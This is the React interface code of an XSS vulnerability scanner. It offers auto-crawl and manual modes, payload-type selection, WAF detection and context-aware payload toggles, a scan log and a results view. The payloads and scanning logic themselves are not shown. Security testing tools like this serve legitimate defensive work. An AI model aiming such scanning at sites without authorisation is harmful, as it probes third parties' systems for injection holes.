        <div className="absolute top-1/4 -left-20 w-72 h-72 bg-blue-500/20 rounded-full blur-3xl opacity-60 animate-pulse"></div>
        <div className="absolute bottom-1/3 -right-20 w-80 h-80 bg-purple-500/20 rounded-full blur-3xl opacity-60 animate-pulse delay-700"></div>
        
        {/* 3D Code Elements */}
        <div className="absolute top-20 right-[20%] text-blue-500/10 rotate-12 transform-gpu opacity-30">
          <Code size={120} className="filter blur-[1px]" />
        </div>
        
        <div className="max-w-6xl mx-auto px-6 pt-16 pb-8 relative z-10">
          <div className="text-center mb-10">
            <h1 className="text-4xl font-bold mb-4 text-transparent bg-clip-text bg-gradient-to-r from-blue-400 to-purple-400">
              Advanced XSS Vulnerability Scanner
                </h1>
            <p className="text-xl text-blue-300/80 max-w-3xl mx-auto">
              Automatically detect Cross-Site Scripting vulnerabilities with intelligent crawling and context-aware payloads
            </p>
          </div>

          {/* Scan Mode Toggle */}
          <div className="mb-8 flex justify-center">
            <div className="flex p-1 bg-zinc-900/80 rounded-xl backdrop-blur-sm border border-zinc-800/50">
              <button
                className={`px-5 py-2 rounded-lg transition-all ${
                  scanMode === "auto" 
                    ? "bg-blue-600 text-white shadow-lg" 
                    : "text-zinc-400 hover:text-zinc-200"
                }`}
                onClick={() => setScanMode("auto")}
              >
                <span className="flex items-center gap-2">
                  <ExternalLink size={16} />
                  Auto-Crawl Mode
                </span>
              </button>
              <button
                className={`px-5 py-2 rounded-lg transition-all ${
                  scanMode === "manual" 
                    ? "bg-blue-600 text-white shadow-lg" 
                    : "text-zinc-400 hover:text-zinc-200"
                }`}
                onClick={() => setScanMode("manual")}
              >
                <span className="flex items-center gap-2">
                  <BookOpen size={16} />
                  Manual Mode
                </span>
              </button>
                        </div>
                      </div>
                      
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-10">
            {/* Left Column - Scanner Controls */}
            <motion.div 
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.5 }}
              className="flex flex-col gap-6"
            >
              <div className="bg-gradient-to-br from-zinc-900/90 to-zinc-950/80 p-6 rounded-xl border border-zinc-800/50 shadow-xl backdrop-blur-sm transition-colors">
                <h2 className="text-xl font-semibold mb-4 flex items-center gap-2 text-blue-300">
                  <Shield className="w-5 h-5" />
                  {scanMode === "auto" ? "Auto-Crawl Configuration" : "XSS Scanner Configuration"} 
                </h2>
                
                <div className="space-y-6">
                  {scanMode === "auto" ? (
                    /* Auto Scan Mode UI */
                    <div>
                      <label className="block text-sm font-medium text-blue-400 mb-2">
                        Target Domain or URL
                      </label>
                      <input
                        type="text"
                        value={autoScanUrl}
                        onChange={(e) => setAutoScanUrl(e.target.value)}
                        onKeyDown={(e) => e.key === "Enter" && !isScanning && autoScan()}
                        placeholder="example.com"
                        className="w-full p-3 rounded-xl bg-zinc-800/70 border border-zinc-700/50 focus:border-blue-500/50 focus:ring-2 focus:ring-blue-500/30 text-white placeholder-zinc-500 outline-none transition-colors"
                      />
                      <p className="mt-2 text-xs text-zinc-400">Enter domain name or URL to automatically crawl and test for XSS</p>
                    </div>
                  ) : (
                    /* Manual Mode UI */
                    <div>
                      <label className="block text-sm font-medium text-blue-400 mb-2">
                        Target URL (with XSS_TEST placeholder)
                      </label>
                          <input
                            type="text"
                            value={url}
                            onChange={(e) => setUrl(e.target.value)}
                        onKeyDown={(e) => e.key === "Enter" && !isScanning && scanForXSS(url)}
                        placeholder="https://example.com/search?q=XSS_TEST"
                        className="w-full p-3 rounded-xl bg-zinc-800/70 border border-zinc-700/50 focus:border-blue-500/50 focus:ring-2 focus:ring-blue-500/30 text-white placeholder-zinc-500 outline-none transition-colors"
                      />
                      <p className="mt-2 text-xs text-zinc-400">Replace the injectable parameter with XSS_TEST</p>
                      
                      {/* Payload Selection - Only in Manual Mode */}
                      <div className="mt-4">
                        <label className="block text-sm font-medium text-blue-400 mb-2">
                          Payload Type
                        </label>
                        <DropdownMenu.Root>
                          <DropdownMenu.Trigger className="flex justify-between items-center p-3 bg-gradient-to-br from-zinc-800/90 to-zinc-900/80 text-white rounded-xl w-full border border-zinc-700/30 shadow-lg hover:shadow-blue-900/5 transition-all duration-200 hover:border-zinc-700/50">
                            <span className="flex items-center gap-2">
                              <Code className="w-4 h-4 text-blue-400" />
                              {selectedList}
                            </span>
                            <ChevronDown className="w-4 h-4 text-zinc-400" />
                          </DropdownMenu.Trigger>
                          <DropdownMenu.Portal>
                            <DropdownMenu.Content 
                              className="bg-zinc-800/95 backdrop-blur-md text-white rounded-xl p-1.5 shadow-lg shadow-black/50 z-50 w-[300px] border border-zinc-700/30"
                              sideOffset={5}
                            >
                              {Object.keys(xssPayloads).map((option) => (
                                <DropdownMenu.Item
                                  key={option}
                                  onSelect={() => setSelectedList(option)}
                                  className="px-3 py-2.5 cursor-pointer hover:bg-blue-600/20 w-full rounded-lg relative flex items-center transition-colors duration-150"
                                >
                                  <span>{option}</span>
                                  {selectedList === option && (
                                    <DropdownMenu.ItemIndicator className="absolute right-2">
                                      <Check className="w-4 h-4 text-blue-400" />
                                    </DropdownMenu.ItemIndicator>
                                  )}
                                </DropdownMenu.Item>
                              ))}
                            </DropdownMenu.Content>
                          </DropdownMenu.Portal>
                        </DropdownMenu.Root>
                      </div>
                    </div>
                  )}
                  
                  {/* Advanced Options Accordion - For Both Modes */}
                  <div className="border border-zinc-800/50 rounded-xl overflow-hidden">
                    <div className="bg-gradient-to-r from-zinc-800/50 to-zinc-800/30 p-3">
                      <h3 className="text-sm font-medium flex items-center gap-2 text-zinc-300">
                        <Settings className="w-4 h-4 text-blue-400" />
                        Advanced Options
                      </h3>
                    </div>
                    <div className="p-4 space-y-3 bg-zinc-900/30">
                      {scanMode === "auto" ? (
                        <>
                          <div className="flex items-center justify-between">
                            <label className="text-xs text-zinc-400">Crawl Depth</label>
                            <input 
                              type="number" 
                              min="1" 
                              max="5"
                              value={advancedOptions.crawlDepth}
                              onChange={(e) => setAdvancedOptions(prev => ({...prev, crawlDepth: Number(e.target.value)}))}
                              className="w-20 p-1 rounded bg-zinc-800 border border-zinc-700 text-white text-xs text-right"
                            />
                          </div>
                          
                          <div className="flex items-center justify-between">
                            <label className="text-xs text-zinc-400">Max URLs to Scan</label>
                            <input 
                              type="number" 
                              min="5" 
                              max="100"
                              value={advancedOptions.maxUrls}
                              onChange={(e) => setAdvancedOptions(prev => ({...prev, maxUrls: Number(e.target.value)}))}
                              className="w-20 p-1 rounded bg-zinc-800 border border-zinc-700 text-white text-xs text-right"
                            />
                          </div>
                        </>
                      ) : null}
                      
                      <div className="flex items-center justify-between">
                        <label className="text-xs text-zinc-400 flex items-center gap-1.5">
                          <Search className="w-3.5 h-3.5" />
                          Auto-detect Context
                        </label>
                        <div 
                          className={`w-10 h-5 rounded-full ${advancedOptions.detectContext ? 'bg-blue-600' : 'bg-zinc-700'} relative cursor-pointer transition-colors`}
                          onClick={() => toggleAdvancedOption('detectContext')}
                        >
                          <div 
                            className={`absolute top-0.5 ${advancedOptions.detectContext ? 'left-5' : 'left-0.5'} w-4 h-4 bg-white rounded-full transition-all`}
                          />
                        </div>
                      </div>
                      
                      <div className="flex items-center justify-between">
                        <label className="text-xs text-zinc-400 flex items-center gap-1.5">
                          <Shield className="w-3.5 h-3.5" />
                          Detect WAF
                        </label>
                        <div 
                          className={`w-10 h-5 rounded-full ${advancedOptions.detectWaf ? 'bg-blue-600' : 'bg-zinc-700'} relative cursor-pointer transition-colors`}
                          onClick={() => toggleAdvancedOption('detectWaf')}
                        >
                          <div 
                            className={`absolute top-0.5 ${advancedOptions.detectWaf ? 'left-5' : 'left-0.5'} w-4 h-4 bg-white rounded-full transition-all`}
                          />
                        </div>
                      </div>
                      
                      <div className="flex items-center justify-between">
                        <label className="text-xs text-zinc-400 flex items-center gap-1.5">
                          <Zap className="w-3.5 h-3.5" />
                          Context-Aware Payloads
                        </label>
                        <div 
                          className={`w-10 h-5 rounded-full ${advancedOptions.adaptivePayloads ? 'bg-blue-600' : 'bg-zinc-700'} relative cursor-pointer transition-colors`}
                          onClick={() => toggleAdvancedOption('adaptivePayloads')}
                        >
                          <div 
                            className={`absolute top-0.5 ${advancedOptions.adaptivePayloads ? 'left-5' : 'left-0.5'} w-4 h-4 bg-white rounded-full transition-all`}
                          />
                        </div>
                      </div>
                      
                      <div className="flex items-center justify-between">
                        <label className="text-xs text-zinc-400">Request Delay (ms)</label>
                        <input 
                          type="number" 
                          min="0" 
                          max="5000"
                          value={advancedOptions.requestDelay}
                          onChange={(e) => setAdvancedOptions(prev => ({...prev, requestDelay: Number(e.target.value)}))}
                          className="w-20 p-1 rounded bg-zinc-800 border border-zinc-700 text-white text-xs text-right"
                        />
                      </div>
                    </div>
                  </div>
                  
                  {/* Status Display */}
                  {crawlStatus.isCrawling && (
                    <div className="bg-indigo-900/20 rounded-xl p-4 border border-indigo-700/30">
                      <div className="text-sm text-indigo-300 mb-2">
                        <div className="flex items-center justify-between mb-2">
                          <span>Crawling website...</span>
                          <div className="animate-spin rounded-full h-4 w-4 border-2 border-indigo-400/20 border-t-indigo-400"></div>
                        </div>
                        <div className="space-y-1">
                          <div className="flex justify-between">
                            <span>URLs discovered:</span>
                            <span className="font-semibold text-indigo-200">{crawlStatus.urlsFound}</span>
                          </div>
                          <div className="flex justify-between">
                            <span>Parameters found:</span>
                            <span className="font-semibold text-indigo-200">{crawlStatus.paramsFound}</span>
                          </div>
                        </div>
                      </div>
                    </div>
                  )}
                  
                  {(detectedContext || detectedWaf) && (
                    <div className="bg-indigo-900/20 rounded-xl p-4 border border-indigo-700/30">
                      {detectedContext && (
                        <div className="text-sm text-indigo-300 mb-2 flex items-center gap-2">
                          <FileText className="w-4 h-4" />
                          <span>Detected Context: <span className="font-semibold text-indigo-200">{detectedContext}</span></span>
                        </div>
                      )}
                      {detectedWaf && (
                        <div className="text-sm text-indigo-300 flex items-center gap-2">
                          <Shield className="w-4 h-4" />
                          <span>WAF Detection: <span className="font-semibold text-indigo-200">{detectedWaf}</span></span>
                        </div>
                      )}
                    </div>
                  )}
                      </div>
                    </div>
                    
                    {/* Scan Button */}
                    <button
                onClick={handleScanClick}
                disabled={isScanning || (scanMode === "auto" ? !autoScanUrl : !url)}
                      className={`${
                  isScanning || (scanMode === "auto" ? !autoScanUrl : !url)
                          ? "bg-zinc-700/80 cursor-not-allowed" 
                          : "bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-500 hover:to-blue-600 hover:shadow-[0_0_20px_rgba(37,99,235,0.3)]"
                      } text-white rounded-xl px-6 py-4 transition-all duration-300 ease-in-out w-full flex items-center justify-center gap-2 shadow-lg transform-gpu active:scale-95 font-medium`}
                    >
                      {isScanning ? (
                        <>
                          <div className="animate-spin rounded-full h-4 w-4 border-2 border-white/20 border-t-white"></div>
                    <span>{scanMode === "auto" ? "Crawling & Scanning..." : "Scanning..."}</span>
                        </>
                      ) : (
                        <>
                          <ArrowRight className="w-5 h-5" />
                    <span>{scanMode === "auto" ? "Start Auto-Crawl & Scan" : "Start XSS Scan"}</span>
                        </>
                      )}
                    </button>
                  </motion.div>
                  
                  {/* Right Column - Terminal Console */}
                  <motion.div
              initial={{ opacity: 0, y: 20 }}
                    animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.5, delay: 0.2 }}
              className="flex flex-col gap-6"
            >
              <div className="bg-gradient-to-br from-zinc-900/90 to-zinc-950/80 p-6 rounded-xl border border-zinc-800/50 shadow-xl h-full backdrop-blur-sm">
                <h2 className="text-xl font-semibold mb-4 flex items-center gap-2 text-blue-300">
                  <Terminal className="w-5 h-5" />
                  Scan Log
                </h2>
                
                      <div 
                        ref={terminalRef}
                  className="font-mono text-sm h-[375px] p-4 bg-black/50 rounded-lg overflow-y-auto border border-zinc-800/50 scrollbar-thin scrollbar-thumb-zinc-700 scrollbar-track-black/20"
                      >
                        {logs.length > 0 ? (
                    logs.map((log, i) => (
                      <div key={i} className="py-0.5">
                        {log.includes("XSS Found") ? (
                          <span className="text-green-400">{log}</span>
                        ) : log.includes("Not vulnerable") ? (
                          <span className="text-red-400">{log}</span>
                        ) : log.includes("Error") ? (
                          <span className="text-yellow-400">{log}</span>
                        ) : log.includes("ℹ️") ? (
                          <span className="text-blue-400">{log}</span>
                        ) : (
                          <span className="text-gray-300">{log}</span>
                        )}
                      </div>
                          ))
                        ) : (
                    <div className="flex flex-col items-center justify-center h-full text-zinc-500">
                      <Terminal className="w-8 h-8 mb-3 opacity-50" />
                      <p>Scan log will appear here</p>
                    </div>
                        )}
                      </div>
                    </div>
                  </motion.div>
          </div>
        </div>
      </div>
      
      <div className="w-full bg-gradient-to-b from-indigo-950 via-indigo-950 to-blue-950/80 min-h-[30vh] relative overflow-hidden">
        {/* Background Elements for Section 2 */}
        <div className="absolute inset-0 bg-[url('/grid.svg')] bg-center opacity-10"></div>
        <div className="absolute top-0 left-0 right-0 h-20 bg-gradient-to-b from-zinc-900 to-transparent"></div>
        
        {/* Decorative Elements */}
        <div className="absolute bottom-0 right-0 w-96 h-96 bg-blue-500/5 rounded-full blur-3xl"></div>
        <div className="absolute bottom-1/4 left-1/4 w-64 h-64 bg-purple-500/5 rounded-full blur-3xl"></div>
        
        <div className="relative z-10 w-full max-w-6xl mx-auto px-6 py-16">
          {/* Results Content */}
          {results.length > 0 ? (
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.5 }}
              className="w-full"
            >
              <div className="text-center mb-10">
                <h2 className="text-3xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-blue-300 to-purple-300 inline-block">
                  Scan Results
                </h2>
                <div className="mt-2 h-1 w-20 bg-gradient-to-r from-blue-500 to-purple-500 mx-auto rounded-full"></div>
              </div>
              
              <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                {results.map((res, idx) => (
                  <motion.div 
                    key={idx}
                    initial={{ opacity: 0, y: 20 }}
                    animate={{ opacity: 1, y: 0 }}
                    transition={{ duration: 0.3, delay: idx * 0.1 }}
                    className="bg-gradient-to-br from-indigo-900/40 to-blue-900/20 backdrop-blur-xl p-5 rounded-xl border border-indigo-500/20 shadow-lg transform-gpu hover:shadow-[0_0_20px_rgba(79,70,229,0.2)] hover:border-indigo-500/30 transition-all duration-300"
                  >
                    <div className="flex items-center justify-between mb-4">
                      <h3 className="font-medium text-lg text-white flex items-center">
                        <Shield className="w-5 h-5 text-indigo-400 mr-2" />
                        Payload #{idx + 1} {res.parameter && `(param: ${res.parameter})`}
                      </h3>
                      <span className={`px-3 py-1 rounded-full text-xs font-medium ${
                        res.vulnerable 
                          ? "bg-gradient-to-r from-red-500/20 to-red-600/20 text-red-300 border border-red-500/30" 
                          : "bg-gradient-to-r from-green-500/20 to-green-600/20 text-green-300 border border-green-500/30"
                      }`}>
                        {res.vulnerable ? "Vulnerable" : "Not Vulnerable"}
                      </span>
                    </div>
                    
                    <div className="space-y-4">
                      <div>
                        <p className="text-sm text-indigo-300 mb-1.5 flex items-center gap-1.5">
                          <Globe className="w-3.5 h-3.5 text-indigo-400" />
                          URL
                        </p>
                        <p className="text-sm font-mono bg-indigo-950/80 p-3 rounded-lg overflow-x-auto whitespace-nowrap border border-indigo-800/50 text-blue-300">
                          {res.url}
                        </p>
                      </div>
                      
                      <div>
                        <p className="text-sm text-indigo-300 mb-1.5 flex items-center gap-1.5">
                          <Code className="w-3.5 h-3.5 text-indigo-400" />
                          Payload
                        </p>
                        <SyntaxHighlighter 
                          language="html" 
                          style={atomDark}
                          customStyle={{
                            background: 'rgba(30, 27, 75, 0.5)',
                            padding: '16px',
                            borderRadius: '8px',
                            fontSize: '12px',
                            border: '1px solid rgba(79, 70, 229, 0.2)'
                          }}
                          wrapLongLines={true}
                        >
                          {res.payload}
                        </SyntaxHighlighter>
                      </div>
                    </div>
                  </motion.div>
                ))}
              </div>
            </motion.div>
          ) : (
            logs.length > 0 && !isScanning && (
              <div className="text-center text-indigo-300 py-10">
                <AlertCircle className="w-10 h-10 mx-auto mb-3 text-indigo-400/60" />
                <h3 className="text-2xl font-medium mb-2">No Vulnerabilities Found</h3>
                <p className="text-indigo-400/60 max-w-lg mx-auto">
                  The scan is complete and no XSS vulnerabilities were detected. Try with different payload types or check another URL.
                </p>
            </div>
            )
          )}
        </div>
      </div>
    </div>
  );
};

export default XssClientWrapper; 